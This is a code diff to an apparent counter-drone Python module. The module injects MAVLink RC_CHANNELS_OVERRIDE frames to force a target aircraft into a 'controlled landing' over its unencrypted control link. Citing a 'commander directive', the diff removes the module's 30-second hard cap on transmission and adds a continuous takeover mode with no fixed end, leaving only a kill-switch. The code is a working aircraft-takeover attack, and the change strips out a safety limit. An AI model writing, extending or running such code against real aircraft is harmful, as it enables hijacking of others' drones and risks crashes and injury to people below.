@@ -21,34 +21,42 @@ NO way to transmit while bypassing those gates.
 
 What this module DOES guarantee, independently and locally:
 
-  1. BOUNDED. The stream runs for the operator-set duration but is HARD-CAPPED
-     at MAX_DURATION_S (30s). It is a bounded engagement window, never
-     transmit-forever. The cap is enforced on wall-clock time, not trusted
-     from the caller.
+  1. OPERATOR-CONTROLLED DURATION (commander directive — the artificial 30 s
+     hard cap has been REMOVED). The stream runs for the operator-set duration,
+     honored verbatim (it may be long), OR — when continuous=True — runs
+     continuous-until-stop with no fixed end. There is NO wall-clock ceiling.
+     The safety is NOT a timer; it is the kill-switch (item 2) plus the
+     neutral-release (item 3). MAX_DURATION_S is retained ONLY as a non-binding
+     default reference value and is no longer enforced as a cap.
 
-  2. IMMEDIATELY ABORTABLE. tx_halted (EMERGENCY ABORT) and a per-run
-     stop_event are polled BEFORE EVERY SINGLE FRAME. An abort arriving
-     mid-stream terminates the takeover before the next frame goes out — an
-     in-progress controlled-landing is stopped, not just future requests
-     refused.
+  2. IMMEDIATELY ABORTABLE. tx_halted (EMERGENCY ABORT / tx_halt / range-auth
+     lost) and a per-run stop_event are polled BEFORE EVERY SINGLE FRAME. An
+     abort or a graceful stop arriving mid-stream terminates the takeover before
+     the next frame goes out — an in-progress controlled-landing is stopped, not
+     just future requests refused. This holds for continuous mode too: a
+     continuous takeover is always instantly switchable-off.
 
-     HONEST END-STATE (F-5): the two stop paths differ, and we do NOT claim
-     control returns "immediately" in both:
-       * ON ABORT (tx_halted / stop_event): we STOP transmitting and send
-         NOTHING further — transmitting after an EMERGENCY ABORT is forbidden.
-         Because no explicit release goes out, the target autopilot LATCHES the
-         last commanded (descent) RC values until ITS OWN RC-override timeout
-         (~3 s on ArduPilot/PX4) expires, after which it reverts to its own
-         RC/failsafe. Control return is therefore delayed by that autopilot
-         timeout, not instantaneous.
-       * ON NORMAL (non-aborted) completion of the bounded window: we emit a
+  3. NEUTRAL-RELEASE ON GRACEFUL END, HONEST END-STATE (F-5). The two stop paths
+     differ, and we do NOT claim control returns "immediately" in both:
+       * ON NORMAL end-of-window completion, OR on a GRACEFUL operator stop
+         (stop_event — a deliberate "Stand Down", not an emergency): we emit a
          short burst of explicit neutral RC_CHANNELS_OVERRIDE "release" frames
          (all channels = 0 => "do not override this channel"), so the craft
-         reclaims its own RC promptly at the planned end rather than waiting out
-         the autopilot timeout. Those release frames are themselves guarded by
-         the tx_halted check — if an abort races in, they are NOT sent.
+         reclaims its own RC PROMPTLY rather than waiting out the autopilot
+         timeout. Those release frames are themselves guarded by the tx_halted
+         check — if an EMERGENCY ABORT / range-auth-off races in, they are NOT
+         sent.
+       * ON EMERGENCY ABORT (tx_halted): we STOP transmitting and send NOTHING
+         further — transmitting after an EMERGENCY ABORT (or when the range-auth
+         lease is off) is forbidden, and that hard rule is NOT relaxed to fire a
+         release burst. Because no explicit release goes out, the target
+         autopilot LATCHES the last commanded (descent) RC values until ITS OWN
+         RC-override timeout (~3 s on ArduPilot/PX4) expires, after which it
+         reverts to its own RC/failsafe. Control return is therefore delayed by
+         that autopilot timeout, not instantaneous — the honest trade for never
+         keying the radio after an abort.
 
-  3. HONEST. RC override has NO effect against an FHSS/encrypted control link
+  4. HONEST. RC override has NO effect against an FHSS/encrypted control link
      (ELRS/CRSF, DJI OcuSync, DSMX, hop-paired RC). If the target link is
      encrypted/hop-paired, run_sustained_takeover REFUSES and reports
      not-applicable rather than transmitting uselessly. See
@@ -78,7 +86,10 @@ from mavlink_codec import (  # noqa: E402
     RC_OVERRIDE_RELEASE,
 )
 
-# Hard cap — imported (F-7), identical everywhere by construction.
+# NON-BINDING default reference window — imported (F-7), identical everywhere by
+# construction. Commander directive: this is NO LONGER a hard cap. Duration is
+# operator-controlled (honored verbatim, or continuous-until-stop); the kill-
+# switch + neutral-release are the real safety, not a wall-clock ceiling.
 MAX_DURATION_S = MANEUVER_TAKEOVER_MAX_DURATION_S
 
 
@@ -116,6 +127,7 @@ def run_sustained_takeover(
     target_component: int = 1,
     duration_s: float = 8.0,
     rc_rate_hz: float = 20.0,
+    continuous: bool = False,
     stop_event: Optional[threading.Event] = None,
     tx_halted: Optional[Callable[[], bool]] = None,
     target_protocol: Optional[str] = None,
@@ -125,20 +137,29 @@ def run_sustained_takeover(
     now: Callable[[], float] = time.monotonic,
     sleep: Callable[[float], None] = time.sleep,
 ) -> TakeoverResult:
-    """Emit RC_CHANNELS_OVERRIDE controlled-landing frames at rc_rate_hz for a
-    bounded, hard-capped duration, aborting immediately on tx_halted/stop_event.
+    """Emit RC_CHANNELS_OVERRIDE controlled-landing frames at rc_rate_hz for an
+    OPERATOR-CONTROLLED duration (no artificial cap), aborting immediately on
+    tx_halted/stop_event.
 
     send_frame(frame_bytes) does the actual TX (e.g. serial.write). It is
     injected so this is unit-testable with a fake sink and a fake clock.
-    tx_halted() is polled before every frame; stop_event.is_set() likewise.
+
+    Two stop inputs, with DIFFERENT end-states (see module docstring item 3):
+      * tx_halted()   — EMERGENCY ABORT / tx_halt / range-auth-off. Polled before
+                        every frame; stops the stream and transmits NOTHING
+                        further (no release burst) — keying the radio after an
+                        abort is forbidden.
+      * stop_event    — a GRACEFUL operator "Stand Down". Polled before every
+                        frame; stops the stream and (like a normal end-of-window)
+                        emits the neutral-release burst so control returns
+                        promptly.
+
+    continuous=True runs with NO fixed end (until tx_halted / stop_event); the
+    operator-set duration is otherwise honored verbatim, with no hard cap.
     now()/sleep() are injectable for deterministic tests.
 
     F-3: target_link_legacy_mavlink is the operator's legacy-MAVLink attestation
     used to pass the fail-closed applicability gate for an UNKNOWN protocol.
-    F-5: on NORMAL completion (bounded window elapsed, not aborted) a short
-    burst of `release_frames` neutral (all-channels-0) RC_CHANNELS_OVERRIDE
-    frames is emitted so control returns promptly; on ABORT nothing further is
-    transmitted (see module docstring).
     """
     # --- Honesty gate (F-3, fail-closed): encrypted/FHSS OR unknown-without-
     #     attestation => not applicable, transmit nothing.
@@ -168,77 +189,101 @@ def run_sustained_takeover(
     if rc_rate_hz <= 0:
         return TakeoverResult(ok=False, error="rc_rate_hz must be > 0")
 
-    # --- Bound the duration on our side; never trust the caller past the cap.
-    capped = max(0.0, min(float(duration_s), MAX_DURATION_S))
-    if capped <= 0.0:
-        return TakeoverResult(ok=False, error="duration_s must be > 0")
+    # --- Duration is operator-controlled — honored verbatim, NO hard cap. A
+    #     bounded (non-continuous) run needs a positive duration; continuous
+    #     mode has no fixed end (runs until tx_halted / stop_event).
+    dur = max(0.0, float(duration_s))
+    if not continuous and dur <= 0.0:
+        return TakeoverResult(ok=False, error="duration_s must be > 0 (or set continuous=True)")
     period = 1.0 / rc_rate_hz
 
-    def _halted() -> bool:
-        if stop_event is not None and stop_event.is_set():
-            return True
-        if tx_halted is not None and tx_halted():
-            return True
-        return False
+    def _emergency_halted() -> bool:
+        # EMERGENCY ABORT / tx_halt / range-auth-off — the caller routes all of
+        # these through tx_halted. Suppresses the release burst (no RF after abort).
+        return bool(tx_halted is not None and tx_halted())
 
-    # Abort even before the first frame if an abort is already in effect.
-    if _halted():
+    def _graceful_stop() -> bool:
+        # A deliberate operator Stand Down. Ends the stream but DOES emit the
+        # neutral-release burst (control returns promptly), unlike an abort.
+        return bool(stop_event is not None and stop_event.is_set())
+
+    # Nothing has been overridden yet — an abort/stop before the first frame just
+    # returns having transmitted nothing (no release needed, no craft engaged).
+    if _emergency_halted() or _graceful_stop():
         return TakeoverResult(ok=True, stopped_early=True, frames_sent=0, elapsed_s=0.0,
-                              reason="EMERGENCY ABORT in effect before takeover start")
+                              reason="stop/abort in effect before takeover start — no RF")
 
     if on_started is not None:
         on_started()
 
     start = now()
-    deadline = start + capped
+    deadline = None if continuous else start + dur
     frames = 0
     seq = 0
+
+    def _emit_release() -> int:
+        """Emit the neutral RC-override release burst (all channels 0 => 'do not
+        override') so the craft reclaims its own RC promptly. Guarded by
+        _emergency_halted(): if an EMERGENCY ABORT / range-auth-off races in,
+        send NOTHING further. Advances the shared seq counter."""
+        nonlocal seq
+        released = 0
+        if release_frames > 0 and not _emergency_halted():
+            release_payload = build_rc_channels_override_payload(
+                target_system, target_component,
+                chan1=RC_OVERRIDE_RELEASE, chan2=RC_OVERRIDE_RELEASE,
+                chan3=RC_OVERRIDE_RELEASE, chan4=RC_OVERRIDE_RELEASE,
+            )
+            for _ in range(release_frames):
+                if _emergency_halted():
+                    break
+                send_frame(build_packet_v2(70, release_payload, sequence=seq & 0xFF))
+                seq += 1
+                released += 1
+        return released
+
     try:
         while True:
-            # (1) Poll abort BEFORE every frame — an abort here stops the stream
-            #     before the next override goes out.
-            if _halted():
-                elapsed = now() - start
-                return TakeoverResult(ok=True, stopped_early=True, frames_sent=frames,
-                                      elapsed_s=elapsed,
-                                      reason="EMERGENCY ABORT — takeover terminated mid-stream")
-            # (2) Hard duration bound — NORMAL completion.
+            # (1) EMERGENCY ABORT / tx_halt / range-auth-off BEFORE every frame —
+            #     stop, and transmit NOTHING further (no release).
+            if _emergency_halted():
+                return TakeoverResult(
+                    ok=True, stopped_early=True, frames_sent=frames, elapsed_s=now() - start,
+                    reason="EMERGENCY ABORT / tx_halt — takeover terminated mid-stream; "
+                           "no further RF (autopilot's own override timeout releases)")
+            # (2) GRACEFUL operator Stand Down — stop, emit the release burst so
+            #     control returns promptly (this is NOT an emergency abort).
+            if _graceful_stop():
+                released = _emit_release()
+                return TakeoverResult(
+                    ok=True, stopped_early=True, frames_sent=frames,
+                    release_frames_sent=released, elapsed_s=now() - start,
+                    reason=(f"graceful stop (Stand Down); emitted {released} neutral "
+                            f"RC-override release frame(s) so control returns promptly"))
+            # (3) NORMAL end-of-window completion (bounded run only) — release.
             t = now()
-            if t >= deadline:
-                # F-5: emit an explicit neutral RC-override release burst so the
-                # craft reclaims its own RC promptly at the planned end instead
-                # of latching the last descent throttle until the autopilot's
-                # own ~3 s override timeout. Guarded by _halted(): if an abort
-                # raced in, send NOTHING further.
-                released = 0
-                if release_frames > 0 and not _halted():
-                    release_payload = build_rc_channels_override_payload(
-                        target_system, target_component,
-                        chan1=RC_OVERRIDE_RELEASE, chan2=RC_OVERRIDE_RELEASE,
-                        chan3=RC_OVERRIDE_RELEASE, chan4=RC_OVERRIDE_RELEASE,
-                    )
-                    for _ in range(release_frames):
-                        if _halted():
-                            break
-                        send_frame(build_packet_v2(70, release_payload, sequence=seq & 0xFF))
-                        seq += 1
-                        released += 1
+            if deadline is not None and t >= deadline:
+                released = _emit_release()
                 return TakeoverResult(
                     ok=True, stopped_early=False, frames_sent=frames,
                     release_frames_sent=released, elapsed_s=t - start,
                     reason=(f"bounded takeover window elapsed; emitted {released} neutral "
                             f"RC-override release frame(s) so control returns promptly"))
-            # (3) One controlled-landing override frame.
+            # (4) One controlled-landing override frame.
             frame = payload_maneuver_takeover(target_system, target_component, seq=seq & 0xFF)
             send_frame(frame)
             frames += 1
             seq += 1
-            # (4) Sleep to the next RC tick, but not past the deadline; wake to
-            #     re-check the abort promptly.
-            remaining = deadline - now()
-            if remaining <= 0:
-                continue
-            sleep(min(period, remaining))
+            # (5) Sleep to the next RC tick, but never past the deadline; wake to
+            #     re-check the stop/abort promptly. Continuous mode sleeps a full
+            #     period each tick (no deadline).
+            if deadline is None:
+                sleep(period)
+            else:
+                remaining = deadline - now()
+                if remaining <= 0:
+                    continue
+                sleep(min(period, remaining))
     except Exception as e:  # never raise out of the transmit loop
         return TakeoverResult(ok=False, frames_sent=frames, elapsed_s=now() - start,
                               error=f"takeover TX error: {e}")
